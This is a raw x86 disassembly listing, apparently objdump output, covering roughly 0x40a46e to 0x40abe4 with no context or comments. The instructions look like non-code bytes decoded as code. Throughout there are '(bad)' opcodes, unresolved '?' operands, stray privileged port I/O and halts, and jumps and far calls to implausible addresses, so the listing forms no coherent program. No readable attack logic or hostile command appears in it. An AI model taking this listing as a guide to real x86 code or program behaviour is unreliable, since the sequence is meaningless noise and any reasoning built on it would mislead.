  40a46e:	fcom   DWORD PTR [esi+0x274b1e67]
  40a474:	ds push esi
  40a476:	shl    DWORD PTR [esp+ecx*4-0x15e07a63],cl
  40a47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a47e:	inc    edi
  40a47f:	sbb    BYTE PTR [ecx],0xd2
  40a482:	out    0x8e,eax
  40a484:	daa    
  40a485:	call   0x85b93739
  40a48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a48b:	push   esp
  40a48c:	rcl    BYTE PTR [edx+0x3410d5f2],cl
  40a492:	sahf   
  40a493:	stc    
  40a494:	or     edi,DWORD PTR [ecx-0x1]
  40a497:	xchg   edi,eax
  40a498:	(bad)  
  40a499:	inc    DWORD PTR [ebp-0x80]
  40a49c:	sub    esi,edi
  40a49e:	cli    
  40a49f:	sbb    esp,eax
  40a4a1:	das    
  40a4a2:	inc    DWORD PTR [esi-0x31aed5d2]
  40a4a8:	jne    0x40a4ef
  40a4aa:	ret    0xf61c
  40a4ad:	adc    edx,ecx
  40a4af:	add    al,0xeb
  40a4b1:	daa    
  40a4b2:	add    ebx,esp
  40a4b4:	ficomp WORD PTR [edx+0x2982008b]
  40a4ba:	clc    
  40a4bb:	push   esi
  40a4bc:	outs   dx,DWORD PTR ds:[esi]
  40a4bd:	inc    DWORD PTR [edx]
  40a4bf:	inc    esi
  40a4c0:	mov    edx,0x4c8ea0f2
  40a4c5:	mov    eax,0x4e39fe80
  40a4ca:	int3   
  40a4cb:	dec    ebp
  40a4cc:	shl    BYTE PTR [ebp+eax*4-0x37],0x7
  40a4d1:	lock inc esp
  40a4d3:	push   ds
  40a4d4:	sub    DWORD PTR [ebx+0x2a],ebp
  40a4d7:	mov    eax,0xe4ae9170
  40a4dc:	push   ebx
  40a4dd:	mov    esi,0x1e673331
  40a4e2:	fs push 0x37
  40a4e5:	addr16 sbb al,0x59
  40a4e8:	dec    eax
  40a4e9:	dec    eax
  40a4ea:	test   BYTE PTR [ebx],dl
  40a4ec:	mov    esi,0x2b0404d8
  40a4f1:	mov    bl,BYTE PTR [esi+ecx*4-0x39]
  40a4f5:	sub    DWORD PTR [ebx],0xffffffed
  40a4f8:	ret    0x4008
  40a4fb:	add    esp,DWORD PTR [edx+0x52853928]
  40a501:	push   ds
  40a502:	push   edi
  40a503:	loop   0x40a51a
  40a505:	cmp    al,0x16
  40a507:	(bad)  
  40a508:	pusha  
  40a509:	push   ds
  40a50a:	test   BYTE PTR [eax-0x669d2922],0x3b
  40a511:	mov    dh,0x8a
  40a513:	fwait
  40a514:	call   0xe450:0xa07ec3ea
  40a51b:	xor    ebp,esi
  40a51d:	popa   
  40a51e:	pop    edx
  40a51f:	jmp    0x3801:0xe1011e42
  40a526:	lock hlt 
  40a528:	dec    ebx
  40a529:	push   0x8c95ca84
  40a52e:	xchg   ecx,eax
  40a52f:	cmp    BYTE PTR [esi+edx*1+0x15ab8ed3],cl
  40a536:	mov    eax,0xd3750f7b
  40a53b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a53c:	and    eax,0x194885dc
  40a541:	push   esi
  40a542:	outs   dx,DWORD PTR ds:[esi]
  40a543:	ja     0x40a52c
  40a545:	retf   0x97fb
  40a548:	dec    ecx
  40a549:	adc    al,0xbb
  40a54b:	mov    bl,0x3b
  40a54d:	inc    ecx
  40a54e:	repnz cmp DWORD PTR [eax+0x51fd8459],edx
  40a555:	mov    ch,0x9
  40a557:	push   cs
  40a558:	mov    bh,0x84
  40a55a:	fcom   QWORD PTR [edi-0x5f2c35a4]
  40a560:	enter  0x3ac0,0x10
  40a564:	rol    bh,cl
  40a566:	mov    edi,gs
  40a568:	scas   al,BYTE PTR es:[edi]
  40a569:	xchg   esi,eax
  40a56a:	scas   al,BYTE PTR es:[edi]
  40a56b:	add    edi,edx
  40a56d:	ins    BYTE PTR es:[edi],dx
  40a56e:	mov    al,0x1e
  40a570:	lods   eax,DWORD PTR ds:[esi]
  40a571:	pop    ds
  40a572:	ins    DWORD PTR es:[edi],dx
  40a573:	add    eax,0x9efb05d0
  40a578:	loope  0x40a5ac
  40a57a:	ret    0x5d91
  40a57d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a57e:	out    0x80,al
  40a580:	push   edx
  40a581:	mov    dh,0xd1
  40a583:	mov    edx,DWORD PTR [edi+0xd]
  40a586:	add    al,0x4c
  40a588:	int3   
  40a589:	adc    DWORD PTR ds:0x3621a690,esi
  40a58f:	jecxz  0x40a563
  40a591:	in     eax,0x89
  40a593:	or     al,0x1a
  40a595:	sub    al,0xf4
  40a597:	inc    eax
  40a598:	ins    DWORD PTR es:[edi],dx
  40a599:	es out dx,al
  40a59b:	cmp    eax,0xa0930fd2
  40a5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a1:	inc    ebp
  40a5a2:	int    0x28
  40a5a4:	and    ecx,DWORD PTR [ebx]
  40a5a6:	test   DWORD PTR [ebp-0x17cc124],eax
  40a5ac:	inc    edi
  40a5ad:	popf   
  40a5ae:	pop    ecx
  40a5af:	xchg   ecx,ecx
  40a5b1:	adc    DWORD PTR [eax],edx
  40a5b3:	ds stos BYTE PTR es:[edi],al
  40a5b5:	jmp    0x198a:0x3fa83b7b
  40a5bc:	mov    ebp,0x49544e2
  40a5c1:	mov    bh,0x4d
  40a5c3:	scas   eax,DWORD PTR es:[edi]
  40a5c4:	dec    ebp
  40a5c5:	push   ds
  40a5c6:	dec    esi
  40a5c7:	jnp    0x40a56b
  40a5c9:	aad    0x47
  40a5cb:	mov    edx,DWORD PTR fs:[eax]
  40a5ce:	out    dx,eax
  40a5cf:	dec    ebx
  40a5d0:	push   edi
  40a5d1:	(bad)  
  40a5d2:	lds    edi,FWORD PTR [ebp+0x12]
  40a5d5:	sbb    al,bh
  40a5d7:	lahf   
  40a5d8:	push   ecx
  40a5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5da:	or     DWORD PTR [esi+0x68762b0d],0x5d
  40a5e1:	push   ss
  40a5e2:	shl    DWORD PTR [eax-0x2e],cl
  40a5e5:	pop    ebp
  40a5e6:	sub    edi,DWORD PTR ds:[eax+ecx*4]
  40a5ea:	pushf  
  40a5eb:	jp     0x40a642
  40a5ed:	adc    al,0x19
  40a5ef:	and    DWORD PTR [ebx+0x33],0xa701a185
  40a5f6:	dec    ecx
  40a5f7:	add    edx,edx
  40a5f9:	sbb    DWORD PTR [ebx],ebp
  40a5fb:	xchg   edx,eax
  40a5fc:	push   edx
  40a5fd:	sbb    BYTE PTR [edx],al
  40a5ff:	out    0xb8,al
  40a601:	and    bh,cl
  40a603:	push   ecx
  40a604:	stos   BYTE PTR es:[edi],al
  40a605:	add    al,0x8
  40a607:	mov    dl,0xf6
  40a609:	push   ds
  40a60a:	pop    ebp
  40a60b:	inc    eax
  40a60c:	fdiv   st,st(7)
  40a60e:	ss dec ebp
  40a610:	jo     0x40a5ae
  40a612:	icebp  
  40a613:	leave  
  40a614:	shl    BYTE PTR [ebx+0x22],cl
  40a617:	and    esi,DWORD PTR [eax+0x40e4818a]
  40a61d:	pusha  
  40a61e:	repz xchg esp,eax
  40a620:	add    edx,DWORD PTR [ebp+0x11b6cc7d]
  40a626:	ss call 0xc73283a8
  40a62c:	ror    BYTE PTR [ebp+ebx*4+0x57227969],cl
  40a633:	or     ch,BYTE PTR [edx+0x14]
  40a636:	shr    edi,0x1a
  40a639:	retf   0xf8c5
  40a63c:	mov    esp,esp
  40a63e:	adc    eax,esi
  40a640:	not    BYTE PTR [eax+0x9]
  40a643:	xchg   edx,eax
  40a644:	jmp    0x40a5e4
  40a646:	(bad)
  40a649:	loop   0x40a5f9
  40a64b:	jmp    0x709b:0x93ebe522
  40a652:	xlat   BYTE PTR ds:[ebx]
  40a653:	sbb    DWORD PTR [esp+esi*2-0x7e6f5afc],ecx
  40a65a:	xchg   ebx,eax
  40a65b:	cld    
  40a65c:	inc    eax
  40a65d:	push   ds
  40a65e:	mov    esi,0x2e191a7d
  40a663:	sub    dh,dl
  40a665:	adc    DWORD PTR [edi],esp
  40a667:	jle    0x40a5eb
  40a669:	adc    al,0x51
  40a66b:	lea    edi,[ebp-0x6b]
  40a66e:	xchg   edx,eax
  40a66f:	ins    BYTE PTR es:[edi],dx
  40a670:	inc    esp
  40a671:	push   ds
  40a672:	aam    0xe7
  40a674:	aaa    
  40a675:	loop   0x40a648
  40a677:	jecxz  0x40a63c
  40a679:	aaa    
  40a67a:	pop    edi
  40a67b:	cs add al,0x11
  40a67e:	aad    0x34
  40a680:	adc    eax,0x263e1156
  40a685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a686:	test   DWORD PTR [ebp+0x55],ebx
  40a689:	xor    cl,BYTE PTR [ebx-0x5b54db76]
  40a68f:	mov    al,0x95
  40a691:	in     eax,dx
  40a692:	xor    cl,BYTE PTR [ebp+0x4944847]
  40a698:	push   cs
  40a699:	out    dx,eax
  40a69a:	test   DWORD PTR [ecx-0xb],ebp
  40a69d:	xlat   BYTE PTR ds:[ebx]
  40a69e:	fs jns 0x40a706
  40a6a1:	or     esi,DWORD PTR [esi-0x245e08b6]
  40a6a7:	mov    fs,WORD PTR [esi+0x4d]
  40a6aa:	inc    eax
  40a6ab:	loop   0x40a6ba
  40a6ad:	imul   BYTE PTR ds:0xe855d2a0
  40a6b3:	mov    edi,0xa6f4af20
  40a6b8:	test   al,0x11
  40a6ba:	je     0x40a6ca
  40a6bc:	push   ecx
  40a6bd:	sub    BYTE PTR [eax],dh
  40a6bf:	in     al,dx
  40a6c0:	mov    ebx,0xac75eecc
  40a6c5:	out    dx,eax
  40a6c6:	retf   0xf5d1
  40a6c9:	imul   edi,DWORD PTR [esi],0xa
  40a6cc:	xchg   BYTE PTR [ecx],bl
  40a6ce:	mov    edi,0x638f308e
  40a6d3:	in     al,dx
  40a6d4:	das    
  40a6d5:	adc    eax,0x70d28f8b
  40a6da:	repnz xchg ecx,eax
  40a6dc:	mov    esi,0x2c27b0f2
  40a6e1:	push   ds
  40a6e2:	in     al,0x8
  40a6e4:	stc    
  40a6e5:	sti    
  40a6e6:	and    eax,0x852ff60b
  40a6eb:	jne    0x40a708
  40a6ed:	aaa    
  40a6ee:	jmp    0x40a6f7
  40a6f0:	sub    DWORD PTR [ebp-0x6f],esi
  40a6f3:	mov    cs,WORD PTR [ebp-0x37112f09]
  40a6f9:	xchg   dh,cl
  40a6fb:	shr    BYTE PTR [bx+di+0x5444],cl
  40a700:	push   0xb1a8b188
  40a705:	daa    
  40a706:	call   0x8d57f93e
  40a70b:	es pop eax
  40a70d:	test   al,0xbd
  40a70f:	add    cl,dh
  40a711:	shr    DWORD PTR [esi],0x57
  40a714:	test   eax,0xc2c2fc05
  40a719:	sub    esi,ebp
  40a71b:	hlt    
  40a71c:	adc    dl,BYTE PTR [ecx]
  40a71e:	jnp    0x40a76d
  40a720:	cli    
  40a721:	(bad)  
  40a723:	and    ecx,DWORD PTR [edx-0x2c]
  40a726:	sub    DWORD PTR ds:0xaf781e71,esi
  40a72c:	cmc    
  40a72d:	push   ebx
  40a72e:	imul   ebp,DWORD PTR [ebx-0x33],0x11
  40a732:	mov    ds,WORD PTR [ecx-0x361e0802]
  40a738:	xchg   esp,eax
  40a739:	jp     0x40a6c6
  40a73b:	push   ebp
  40a73c:	shl    DWORD PTR [ecx+ecx*8],0x4e
  40a740:	nop
  40a741:	test   eax,0x13f0046c
  40a746:	sub    BYTE PTR [ecx],cl
  40a748:	mov    ?,ebx
  40a74a:	dec    ecx
  40a74b:	adc    BYTE PTR [edx-0x2d436e7f],dl
  40a751:	paddd  mm1,QWORD PTR [edx+ecx*2]
  40a755:	cs test al,0xa1
  40a758:	mov    esi,0x5f8c4011
  40a75d:	push   ss
  40a75e:	rol    DWORD PTR [edx],0xb1
  40a761:	mov    ds:0x9ff50385,al
  40a766:	mov    bl,0xab
  40a768:	jle    0x40a7e8
  40a76a:	dec    esi
  40a76b:	mov    cs,WORD PTR [ecx+ecx*2-0x1eba87b0]
  40a772:	jbe    0x40a7e7
  40a774:	and    ebx,DWORD PTR [esi+eax*4-0x2f8b878f]
  40a77b:	sub    edx,edx
  40a77d:	or     DWORD PTR [ebx+0x388eab2],ebx
  40a783:	mov    ?,WORD PTR ds:0xd9c5cde1
  40a789:	shl    DWORD PTR [esi],0x30
  40a78c:	rcl    BYTE PTR [edi+ebx*8-0x33e18303],1
  40a793:	jl     0x40a7ea
  40a795:	push   esp
  40a796:	aam    0xa9
  40a798:	fxsave ds:0x27d39957
  40a79f:	mul    edi
  40a7a1:	arpl   WORD PTR [ebx+ebp*4+0x21ffc772],ax
  40a7a8:	shl    DWORD PTR [eax-0x7e],cl
  40a7ab:	mov    es,WORD PTR [eax]
  40a7ad:	mov    ebp,0xcb33b035
  40a7b2:	in     eax,0x67
  40a7b4:	shr    BYTE PTR [edi],cl
  40a7b6:	jmp    0x1fef15da
  40a7bb:	call   0x86f27d46
  40a7c0:	sar    BYTE PTR ds:0xa7527e66,cl
  40a7c6:	iret   
  40a7c7:	cdq    
  40a7c8:	daa    
  40a7c9:	mov    al,0x88
  40a7cb:	mov    edi,0x83bfbdd0
  40a7d0:	stc    
  40a7d1:	push   ecx
  40a7d2:	push   es
  40a7d3:	loope  0x40a7bb
  40a7d5:	in     eax,0x53
  40a7d7:	xchg   ebx,eax
  40a7d8:	sub    BYTE PTR [ebx],0xe5
  40a7db:	btc    DWORD PTR [esi+0x7d],edi
  40a7df:	adc    DWORD PTR [ebp-0x15b2e4cf],edi
  40a7e5:	js     0x40a77e
  40a7e7:	mov    ?,WORD PTR [ebx-0x66]
  40a7ea:	cmp    DWORD PTR [ebx-0x771e909a],ecx
  40a7f0:	in     al,dx
  40a7f1:	dec    eax
  40a7f2:	int    0x4e
  40a7f4:	cwde   
  40a7f5:	in     al,dx
  40a7f6:	jg     0x40a839
  40a7f8:	fstp   DWORD PTR [eax*4-0x4ffd985d]
  40a7ff:	mov    ecx,0x8effa41c
  40a804:	lods   al,BYTE PTR ds:[esi]
  40a805:	cmc    
  40a806:	lock and DWORD PTR [esi-0x2d085191],ecx
  40a80d:	xchg   edx,eax
  40a80e:	or     BYTE PTR [edi],0x39
  40a811:	mov    BYTE PTR [eax+0x16],dl
  40a814:	xchg   edx,eax
  40a815:	adc    DWORD PTR [edi-0x43],esp
  40a818:	cwde   
  40a819:	pop    edi
  40a81a:	pushf  
  40a81b:	jecxz  0x40a848
  40a81d:	test   BYTE PTR fs:[esi+ecx*1-0x52],al
  40a822:	ja     0x40a89d
  40a824:	int    0xc6
  40a826:	mov    edi,0xc57ab68e
  40a82b:	or     al,bh
  40a82d:	pop    ss
  40a82e:	out    0xd,eax
  40a830:	neg    ch
  40a832:	sbb    al,0x66
  40a834:	test   eax,0xb35f39d3
  40a839:	cli    
  40a83a:	add    eax,0xaa8c92e8
  40a83f:	mov    ?,eax
  40a841:	mov    edi,0x650e484e
  40a846:	pushf  
  40a847:	jg     0x40a7f2
  40a849:	xor    eax,0x332c82ac
  40a84e:	adc    eax,0x359ec36
  40a853:	stos   DWORD PTR es:[edi],eax
  40a854:	or     bl,0x5
  40a857:	inc    edi
  40a858:	dec    esp
  40a859:	inc    edi
  40a85a:	lahf   
  40a85b:	dec    ebp
  40a85c:	add    DWORD PTR [edi-0x6b191d77],esi
  40a862:	mov    ah,0x23
  40a864:	shl    esp,0xfc
  40a867:	dec    esi
  40a868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a869:	jo     0x40a807
  40a86b:	sub    al,0x74
  40a86d:	xchg   BYTE PTR [ebp-0x5218f572],cl
  40a873:	call   0x87ea:0xf6ec89bf
  40a87a:	rcl    BYTE PTR [edi+0x7030a1e2],1
  40a880:	adc    cl,ch
  40a882:	mov    ?,ecx
  40a884:	adc    BYTE PTR [ebx+ecx*1],bl
  40a887:	pop    ebp
  40a888:	popa   
  40a889:	cmp    esp,esi
  40a88b:	mov    esi,0xe6a4024b
  40a890:	ror    DWORD PTR [ebp+0x674a6ba9],cl
  40a896:	cld    
  40a897:	jb     0x772b8fea
  40a89d:	push   ds
  40a89e:	clc    
  40a89f:	fwait
  40a8a0:	inc    eax
  40a8a1:	cmc    
  40a8a2:	hlt    
  40a8a3:	das    
  40a8a4:	sbb    DWORD PTR [esi-0x2dc8be7c],ecx
  40a8aa:	inc    ecx
  40a8ab:	(bad)
  40a8af:	test   eax,0x42130f30
  40a8b4:	and    BYTE PTR [ecx],dl
  40a8b6:	or     edi,DWORD PTR [edi+0x59acbefc]
  40a8bc:	inc    edx
  40a8bd:	fist   DWORD PTR ds:0x5ce3d24a
  40a8c3:	retf   
  40a8c4:	sbb    eax,0xba44be66
  40a8c9:	adc    DWORD PTR [eax+0x2e84c084],ecx
  40a8cf:	sbb    cl,BYTE PTR ss:[ebx]
  40a8d2:	sub    al,0xc0
  40a8d4:	jns    0x40a8f4
  40a8d6:	cdq    
  40a8d7:	(bad)  
  40a8d8:	jmp    0x40a87a
  40a8da:	xchg   BYTE PTR [eax-0x3e],bl
  40a8dd:	adc    DWORD PTR [ebx-0x5ca0123d],esp
  40a8e3:	xchg   DWORD PTR [esi+0x25ce8593],ebp
  40a8e9:	ja     0x40a912
  40a8eb:	shr    cl,cl
  40a8ed:	in     eax,dx
  40a8ee:	shr    BYTE PTR [eax-0x3a774d15],cl
  40a8f4:	pop    eax
  40a8f5:	xchg   ebp,eax
  40a8f6:	xor    DWORD PTR [ebx+ecx*2-0x7],ebx
  40a8fa:	rol    DWORD PTR ds:0x9227a063,0x74
  40a902:	(bad)  
  40a903:	mov    gs,WORD PTR [edi]
  40a905:	dec    eax
  40a906:	pop    ebx
  40a907:	ins    DWORD PTR es:[edi],dx
  40a908:	xor    al,0xc7
  40a90a:	mov    ch,0xee
  40a90c:	addr16 loopne 0x40a8c5
  40a90f:	mov    ?,WORD PTR [edx]
  40a911:	cli    
  40a912:	and    bl,cl
  40a914:	lods   eax,DWORD PTR gs:[esi]
  40a916:	or     al,0x33
  40a918:	and    edx,DWORD PTR [ebx]
  40a91a:	test   DWORD PTR [edi+0x80788ce],edi
  40a920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a921:	mov    dl,0x70
  40a923:	mov    ?,WORD PTR [eax-0x70]
  40a926:	outs   dx,BYTE PTR ds:[esi]
  40a927:	shr    BYTE PTR [ecx-0x2d85ffe6],0xac
  40a92e:	xchg   edx,eax
  40a92f:	pusha  
  40a930:	jp     0x40a8c4
  40a932:	(bad)  
  40a933:	push   ecx
  40a934:	push   ecx
  40a935:	push   ds
  40a936:	xchg   ebp,eax
  40a937:	xchg   DWORD PTR [edx],ebp
  40a939:	das    
  40a93a:	data16 or ah,BYTE PTR [ebx+0x3d3a8503]
  40a941:	dec    edx
  40a942:	enter  0x55a1,0x10
  40a946:	jb     0x40a8d6
  40a948:	push   eax
  40a949:	pop    ecx
  40a94a:	inc    ebp
  40a94b:	stos   DWORD PTR es:[edi],eax
  40a94c:	push   esp
  40a94d:	repz data16 gs ror al,cl
  40a952:	ret    0xef0b
  40a955:	cs retf 
  40a957:	aaa    
  40a958:	push   ds
  40a959:	fld    st(7)
  40a95b:	jns    0x40a91d
  40a95d:	mov    ch,0x2a
  40a95f:	sbb    BYTE PTR [eax],al
  40a961:	sub    BYTE PTR [ebp-0x17],al
  40a964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a965:	jno    0x40a9b9
  40a967:	xlat   BYTE PTR ds:[ebx]
  40a968:	rcr    BYTE PTR [ebp-0x40],cl
  40a96b:	mov    ah,0x18
  40a96d:	mov    esp,0x236f9712
  40a972:	xlat   BYTE PTR ds:[ebx]
  40a973:	sbb    dl,BYTE PTR [edx-0x4c]
  40a976:	pop    esi
  40a977:	cli    
  40a978:	(bad)  
  40a979:	and    al,0x3c
  40a97b:	aam    0xd2
  40a97d:	lods   al,BYTE PTR ds:[esi]
  40a97e:	mov    ah,0x21
  40a980:	inc    ebx
  40a981:	mov    BYTE PTR [ebp-0x54f00909],ch
  40a987:	jnp    0x40a9a8
  40a989:	sbb    eax,0x512ab979
  40a98e:	cmp    DWORD PTR [ebp+0x6b],ebp
  40a991:	pop    edi
  40a992:	test   BYTE PTR [edi],al
  40a994:	in     eax,dx
  40a995:	and    eax,0xeb53ce30
  40a99a:	mov    ebp,0xb7eb3e8e
  40a99f:	sbb    eax,0x345bc0ab
  40a9a4:	sar    ah,cl
  40a9a6:	out    dx,eax
  40a9a7:	xchg   ebx,eax
  40a9a8:	ret    0x386e
  40a9ab:	outs   dx,DWORD PTR ds:[esi]
  40a9ac:	mov    dl,0x11
  40a9ae:	xor    eax,0xe013cc0c
  40a9b3:	cdq    
  40a9b4:	test   DWORD PTR [edx],ebp
  40a9b6:	mov    bh,dl
  40a9b8:	jp     0x40aa32
  40a9ba:	pop    edi
  40a9bb:	je     0x40a94e
  40a9bd:	or     al,0x5a
  40a9bf:	adc    ecx,DWORD PTR [esi+0xe9ff61a]
  40a9c5:	stos   DWORD PTR es:[edi],eax
  40a9c6:	push   eax
  40a9c7:	inc    ebx
  40a9c8:	adc    dh,BYTE PTR [edx+0x3d]
  40a9cb:	popf   
  40a9cc:	mov    ebx,0x68898b31
  40a9d1:	or     al,0x31
  40a9d3:	sbb    eax,0xd135718f
  40a9d8:	inc    edx
  40a9d9:	push   ds
  40a9da:	stos   BYTE PTR es:[edi],al
  40a9db:	sub    BYTE PTR [edi+0x22e391de],0x89
  40a9e2:	test   DWORD PTR [esi],ebp
  40a9e4:	push   ebx
  40a9e5:	push   ss
  40a9e6:	dec    esp
  40a9e7:	imul   esp,DWORD PTR [ebp-0x6a],0x4adb8eb0
  40a9ee:	adc    al,0x1d
  40a9f0:	or     al,0x38
  40a9f2:	dec    eax
  40a9f3:	adc    dl,dl
  40a9f5:	(bad)  
  40a9f6:	aaa    
  40a9f7:	pop    edx
  40a9f8:	dec    ebp
  40a9f9:	in     al,0x9d
  40a9fb:	out    0xff,eax
  40a9fd:	adc    esp,DWORD PTR [edi-0x54]
  40aa00:	or     eax,0x9216cbc2
  40aa05:	(bad)  
  40aa06:	xor    eax,0xe309d294
  40aa0b:	xchg   dl,al
  40aa0d:	cs jo  0x40aa20
  40aa10:	push   edi
  40aa11:	cmp    bh,BYTE PTR [ebx]
  40aa13:	(bad)  
  40aa14:	fist   DWORD PTR [ecx]
  40aa16:	mov    ebp,0xf242557f
  40aa1b:	icebp  
  40aa1c:	neg    BYTE PTR [eax+ebp*2-0x62102d2a]
  40aa23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa24:	ror    BYTE PTR [eax],0x7e
  40aa27:	mov    al,BYTE PTR [edx]
  40aa29:	arpl   sp,ax
  40aa2b:	dec    esi
  40aa2c:	mov    ecx,0x13f98acc
  40aa31:	jecxz  0x40a9b8
  40aa33:	mov    esp,0x1c773466
  40aa38:	or     edx,esp
  40aa3a:	(bad)  
  40aa3b:	mov    ds,WORD PTR [ebp+0x3b]
  40aa3e:	adc    al,0x58
  40aa40:	push   0x929d35bd
  40aa45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa46:	fcom   st(3)
  40aa48:	out    0x85,eax
  40aa4a:	sbb    BYTE PTR [ebx-0x3b9a5877],bl
  40aa50:	push   edx
  40aa51:	ds jnp 0x40aa26
  40aa54:	aas    
  40aa55:	inc    esp
  40aa56:	test   cl,bl
  40aa58:	mov    al,0x79
  40aa5a:	mov    edi,0x618b7fb5
  40aa5f:	mov    BYTE PTR [edx-0x13f691d0],bl
  40aa65:	push   ecx
  40aa66:	dec    ecx
  40aa67:	data16 lods al,BYTE PTR ds:[esi]
  40aa69:	pop    ds
  40aa6a:	fcomp  QWORD PTR [ebp-0x267a189e]
  40aa70:	pop    esp
  40aa71:	fisttp DWORD PTR [edi+eax*4]
  40aa74:	mov    cl,0x77
  40aa76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa77:	mov    gs,WORD PTR [ebx-0x6abf9da4]
  40aa7d:	test   eax,0xa3d2363a
  40aa82:	fnstsw WORD PTR [ebp+0x569c4429]
  40aa88:	xchg   esi,eax
  40aa89:	adc    DWORD PTR [ebx+edx*4-0x31],esi
  40aa8d:	push   edi
  40aa8e:	mov    DWORD PTR [ebx],edx
  40aa90:	jb     0x40aab7
  40aa92:	sti    
  40aa93:	push   cs
  40aa94:	pop    esp
  40aa95:	stc    
  40aa96:	test   DWORD PTR [esi+0x49],edi
  40aa99:	je     0x40aa74
  40aa9b:	lock test BYTE PTR [esi],bl
  40aa9e:	lds    eax,FWORD PTR [eax+0x42]
  40aaa1:	mov    ecx,0x45fdc83b
  40aaa6:	sbb    DWORD PTR [ebx-0x6ad4c22e],ebx
  40aaac:	call   DWORD PTR [ebx-0x51]
  40aaaf:	cmp    al,BYTE PTR [edi+0x24]
  40aab2:	jl     0x40aa3b
  40aab4:	sar    BYTE PTR [ebp-0x6],cl
  40aab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab8:	jmp    0x40ab0b
  40aaba:	add    ebx,DWORD PTR [ebp-0x1e]
  40aabd:	inc    ebp
  40aabe:	push   ecx
  40aabf:	mov    edx,0x974de5b4
  40aac4:	retf   
  40aac5:	loopne 0x40aa7f
  40aac7:	int3   
  40aac8:	fyl2x  
  40aaca:	fwait
  40aacb:	shr    BYTE PTR [ecx],cl
  40aacd:	fwait
  40aace:	clc    
  40aacf:	cmp    al,0x54
  40aad1:	call   0x4548:0xf7bdd885
  40aad8:	pop    edx
  40aad9:	sbb    ecx,DWORD PTR [esi-0x9d15b87]
  40aadf:	into   
  40aae0:	adc    BYTE PTR [esi-0x79],0x1d
  40aae4:	shr    BYTE PTR [eax],1
  40aae6:	xor    esp,DWORD PTR [eax+0x64]
  40aae9:	sahf   
  40aaea:	ds cmp al,0x9
  40aaed:	inc    edx
  40aaee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaef:	cwde   
  40aaf0:	push   ds
  40aaf1:	xor    BYTE PTR [edi],al
  40aaf3:	in     eax,0xb2
  40aaf5:	mov    ch,0xd
  40aaf7:	sahf   
  40aaf8:	cmp    BYTE PTR [ecx-0x7b],dh
  40aafb:	(bad)  
  40aafc:	aad    0xfd
  40aafe:	lods   al,BYTE PTR ds:[esi]
  40aaff:	shl    DWORD PTR [ebp+0x7fbaa9b1],cl
  40ab05:	adc    eax,0x8fe6ac7d
  40ab0a:	mov    DWORD PTR [esi-0x428f9dcc],ecx
  40ab10:	cld    
  40ab11:	mov    ecx,0x73775c85
  40ab16:	sar    esp,cl
  40ab18:	cmp    DWORD PTR [esi-0x3a],esi
  40ab1b:	out    0x7c,al
  40ab1d:	pop    ds
  40ab1e:	mov    bl,0xee
  40ab20:	cdq    
  40ab21:	fist   DWORD PTR [esi-0x33]
  40ab24:	mov    edx,0x196ec552
  40ab29:	ins    BYTE PTR es:[edi],dx
  40ab2a:	test   BYTE PTR [eax],ah
  40ab2c:	lods   al,BYTE PTR ds:[esi]
  40ab2d:	add    edi,DWORD PTR [esi]
  40ab2f:	or     al,0x0
  40ab31:	mov    eax,0xe85e8d2e
  40ab36:	pop    ds
  40ab37:	iret   
  40ab38:	into   
  40ab39:	test   al,0x86
  40ab3b:	xchg   edx,eax
  40ab3c:	rcr    BYTE PTR [ebx-0x9cad2fa],cl
  40ab42:	pop    ebp
  40ab43:	mov    ah,0x40
  40ab45:	push   ds
  40ab46:	mov    ch,0xb6
  40ab48:	and    eax,0x99896f0
  40ab4d:	dec    ebx
  40ab4e:	test   BYTE PTR [ebx+0x2013fe0a],dl
  40ab54:	adc    DWORD PTR [eax+ebx*1+0x6788658e],eax
  40ab5b:	jbe    0x40abb4
  40ab5d:	mov    ds:0x4d38d232,eax
  40ab63:	adc    al,ah
  40ab65:	cli    
  40ab66:	ret    
  40ab67:	mov    bl,0xbd
  40ab69:	sbb    al,0xf4
  40ab6b:	fisttp QWORD PTR [edx-0x7f41f9ea]
  40ab71:	sbb    al,0xd0
  40ab73:	call   0x80933d38
  40ab78:	shl    eax,cl
  40ab7a:	lods   al,BYTE PTR ds:[esi]
  40ab7b:	loopne 0x40ab6a
  40ab7d:	inc    ebp
  40ab7e:	dec    esp
  40ab7f:	outs   dx,DWORD PTR ds:[esi]
  40ab80:	popa   
  40ab81:	push   ds
  40ab82:	ret    
  40ab83:	fcmovb st,st(0)
  40ab85:	mov    al,0x53
  40ab87:	xchg   DWORD PTR [edx],edi
  40ab89:	add    DWORD PTR [ebp-0x3c],0x57fde599
  40ab90:	inc    ecx
  40ab91:	and    ch,BYTE PTR [edi+0x74]
  40ab94:	fstp   DWORD PTR [ebp+0x10c48eed]
  40ab9a:	(bad)  
  40ab9c:	add    BYTE PTR ss:[eax-0x54f07f82],al
  40aba3:	push   cs
  40aba4:	or     bh,bl
  40aba6:	jae    0x40abb5
  40aba8:	pop    esp
  40aba9:	push   ds
  40abaa:	je     0x40ac10
  40abac:	sub    eax,0xc53691af
  40abb1:	sub    dl,BYTE PTR [eax+0x191f7122]
  40abb7:	and    eax,0x1414d564
  40abbc:	mov    cl,ch
  40abbe:	mov    ecx,DWORD PTR [esi-0x5282d0bc]
  40abc4:	and    eax,0xaf293a5f
  40abc9:	or     ecx,ebp
  40abcb:	add    DWORD PTR [ebx-0x47bfba6e],eax
  40abd1:	popf   
  40abd2:	push   ecx
  40abd3:	(bad)  
  40abd4:	jmp    0xc410cc65
  40abd9:	cmp    ebp,esi
  40abdb:	ret    0x7a7
  40abde:	test   DWORD PTR [eax-0x15d4a255],edi
  40abe4:	cmp    al,BYTE PTR [eax-0x70]
